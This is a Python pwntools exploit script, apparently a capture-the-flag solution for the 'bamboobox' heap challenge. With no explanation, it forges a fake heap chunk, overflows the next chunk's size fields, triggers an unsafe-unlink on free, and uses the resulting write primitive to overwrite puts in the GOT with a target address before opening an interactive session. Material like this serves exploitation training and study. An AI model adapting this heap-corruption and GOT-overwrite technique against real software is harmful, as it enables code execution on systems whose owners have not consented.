#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./bamboobox")
#gdb.attach(p)
elf = ELF("./bamboobox")
puts_got = elf.got['puts']
magic = 0x400d49
itemlist = 0x6020c0

def show():
    p.sendlineafter("Your choice:", '1')

def add(length, name):
    p.sendlineafter("Your choice:", '2')
    p.sendlineafter("length of item name:", str(length))
    p.sendlineafter("Please enter the name of item:", name)

def change(index, length, name):
    p.sendlineafter("Your choice:", '3')
    p.sendlineafter("index of item:", str(index))
    p.sendlineafter("length of item name:", str(length))
    p.sendafter("name of the item:", name)

def remove(index):
    p.sendlineafter("Your choice:", '4')
    p.sendlineafter("index of item:", str(index))

add(0x20, 'AAAA')
add(0x20, 'BBBB')
add(0x80, 'CCCC')

gdb.attach(p)

# itemlist[1]-0x18, itemlist[1]-0x10
pay = p64(0) + p64(0) + p64(itemlist+0x18-0x18) + p64(itemlist+0x18-0x10) 
pay += p64(0x20) + p64(0x90) # itemlist[2] prevsize, size
change(1, len(pay), pay)

remove(2)

change(1, 0x10, 'a'*8 + p64(puts_got))

change(0, 0x8, p64(magic))

p.interactive()


